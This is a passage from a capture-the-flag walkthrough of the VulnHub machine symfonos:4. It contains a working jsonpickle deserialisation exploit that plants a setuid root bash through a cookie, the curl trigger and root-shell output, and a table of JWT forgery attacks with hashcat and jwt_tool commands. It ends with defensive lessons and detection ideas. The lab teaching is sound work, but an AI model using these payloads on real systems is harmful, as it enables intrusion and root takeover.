> > because Markdown eats the `$`** — verify against the library source
> > (`serialize.js`) before you build a payload.
>
> **Deep dive:** [CONCEPTS §13.9 — Insecure deserialisation](../../docs/CONCEPTS.md#139-insecure-deserialisation)

```python
import jsonpickle, base64
from flask import Flask, request
app = Flask(__name__)

@app.route('/')
def index():
    user = request.cookies.get('user')
    if user:
        data = jsonpickle.decode(base64.b64decode(user))   # <-- UNSAFE
        ...
```

> **Why it works:** `jsonpickle` (and Python's `pickle`) can reconstruct **arbitrary
> objects** from untrusted data. When the app **`decode`s a cookie we control**, the
> object's `__reduce__` method is invoked on the server — as **root**. This is
> **insecure deserialization**.

### 4.3 Craft the pickle payload

```bash
cat > exploit.py <<'EOF'
import jsonpickle, base64, os

class RCE(object):
    def __reduce__(self):
        cmd = 'cp /bin/bash /tmp/suidbash; chmod +s /tmp/suidbash'
        return os.system, (cmd,)

payload = base64.b64encode(jsonpickle.encode(RCE()).encode())
print(payload.decode())
EOF
python3 exploit.py
```


> ### 📖 Concept — JSON Web Tokens, and how they get attacked
>
> A **JWT** is three base64**url**-encoded sections joined by dots:
> **`header.payload.signature`**. Anything starting `eyJ` is almost certainly a JWT —
> `eyJ` is the base64url encoding of `{"`, the start of a JSON object.
>
> ```bash
> echo 'eyJhbGciOiJIUzI1NiJ9' | base64 -d 2>/dev/null; echo
> # {"alg":"HS256"}
> ```
>
> The **payload is only encoded, not encrypted** — read it freely. What the signature
> protects is *integrity*: the server signs header+payload with a secret so you cannot
> edit them.
>
> **The classic attacks:**
>
> | Attack | How |
> | --- | --- |
> | **`alg: none`** | Set the header algorithm to `none` and **delete the signature**. Unsigned-verification bugs accept it. |
> | **Weak HMAC secret** | The signature is `HMAC-SHA256(header.payload, secret)`. If the secret is a common word, crack it offline and forge any token. |
> | **Algorithm confusion (RS→HS)** | If the server expects RSA, switch to `HS256` and sign with the *public* key as the HMAC secret — the server verifies with the same bytes. |
> | **`kid` injection** | A key-ID pointing at a predictable path (`/dev/null`, `../../file`) makes the server "verify" with attacker-known bytes. |
> | **Claim tampering** | Change `"role":"user"` → `"admin"`, or `"sub"` to another user, then re-sign. |
>
> ```bash
> hashcat -m 16500 -a 0 token.txt rockyou.txt     # crack an HS256 JWT secret
> # or use jwt_tool to automate every attack above:
> python3 jwt_tool.py <token> -M at                 # "all tests"
> ```
>
> `-m 16500` is hashcat's mode for a JWT. A cracked secret means you can mint tokens
> for **any** user, including the administrator.
>
> **Deep dive:** [CONCEPTS §13.10 — Authentication bypass checklist](../../docs/CONCEPTS.md#1310-authentication-bypass-checklist)

```text
eyJweS9vYmplY3QiOiAiX19tYWluX18uUkNFIiwgInB5L3JlZHVjZSI6IFsi...  (long string)
```

> **Why it works:** `__reduce__` tells Python how to rebuild the object. We return the
> pair `(os.system, (cmd,))`, so unpickling runs `os.system(cmd)` — planting a
> **setuid Bash** at `/tmp/suidbash` with the privileges of the process that
> deserializes it (root).

### 4.4 Trigger it

Send the payload in the `user` cookie (Burp Suite or `curl`):

```bash
curl -s -b 'user=<paste-the-base64-payload-here>' http://127.0.0.1:8080/
ls -l /tmp/suidbash
/tmp/suidbash -p
```

```text
-rwsr-sr-x 1 root root /tmp/suidbash
# whoami
root
```

> **Why it works:** the root app deserializes our cookie, our command runs as root,
> and the setuid bit lets us keep root when we run it ourselves.

![Privilege escalation to root](images/06-privesc.png)

### 4.5 The root flag

```bash
cat /root/proof.txt
```

```text
Congrats on rooting symfonos:4!
(symfonos root proof)
```

![Root flag](images/07-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Directory contents reused as a wordlist | `/gods/*.log` | Enables discovery of `sea.php` |
| 2 | SQL injection in the login form | `atlantis.php` | Authentication bypass |
| 3 | Weak session check (`isset` only) | `sea.php` | Bypasses the login without valid creds |
| 4 | Local File Inclusion / path traversal | `sea.php?g=...` (appends `.log`) | Arbitrary file read |
| 5 | Log poisoning of `auth.log` | `/var/log/auth.log` + LFI | Remote Code Execution as `www-data` |
| 6 | Hard-coded DB password reused for a user | `atlantis.php` → `poseidon` | Lateral movement to `poseidon` |
| 7 | Insecure deserialization | Root Python app on `127.0.0.1:8080` (`jsonpickle`) | Root code execution |

## 6. Defensive lessons (blue team)

- **Use parameterised queries / prepared statements.** A login form should never be
  built by string concatenation; SQL injection would be impossible.
- **Check session *values*, not just existence.** `isset($_SESSION['logged_in'])` is
  not authentication. Compare against `=== true` and rotate session IDs.
- **Never concatenate user input into `include`/`file_get_contents`.** Validate against
  an allow-list of permitted filenames and reject `../`.
- **Do not let untrusted input reach logs the app can include.** Restrict web-server
  read access, and never `include` anything under `/var/log`.
- **Do not hard-code credentials, and never reuse them.** Secrets belong in a vault,
  and one password must never unlock several identities.
- **Never deserialize untrusted data.** `pickle`/`jsonpickle` are not safe for cookies
  or user input. Use a signed, data-only format (e.g. a JWT with a fixed schema).
- **Bind admin/dev services with least privilege.** A localhost web app should not run
  as `root`; use a dedicated low-privilege service account.
- **Detection ideas:** alert on SQL keyword patterns in web requests (`OR 1=1`, `--`),
  on `php://filter` or `../` in URLs, on SSH clients submitting `<?php` usernames, and
  on new setuid files in `/tmp`.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/symfonos-4,347/>
- Community writeups consulted:
  - [Vulnhub: Symfonos 4 — ikuamike](https://blog.ikuamike.io/posts/2021/symfonos4/)
  - [Symfonos:4 Walkthrough — Tuk Bahadur Kumhal (Medium)](https://tukbdr.medium.com/symfonos-4-vulnhub-walkthrough-b31b426cbb30)
- Vendor advisories / docs:
  - [HackTricks — Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization)
  - [Into the Jar: jsonpickle exploitation — Versprite](https://versprite.com/vs-labs/into-the-jar-jsonpickle-exploitation/)
  - [HackTricks — File Inclusion / LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
  - [GTFOBins](https://gtfobins.github.io/) — abusing SUID/sudo binaries
  - [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (`ip a` / `arp-scan`)
- [ ] `images/02-nmap.png` — port/service scan (22, 80)
- [ ] `images/03-enum.png` — `/gods` and discovery of `sea.php`
- [ ] `images/04-lfi.png` — confirming the LFI in `sea.php`
- [ ] `images/05-foothold.png` — log-poisoning RCE / reverse shell
- [ ] `images/06-privesc.png` — `jsonpickle` deserialization → setuid Bash → root
- [ ] `images/07-root-flag.png` — `/root/proof.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
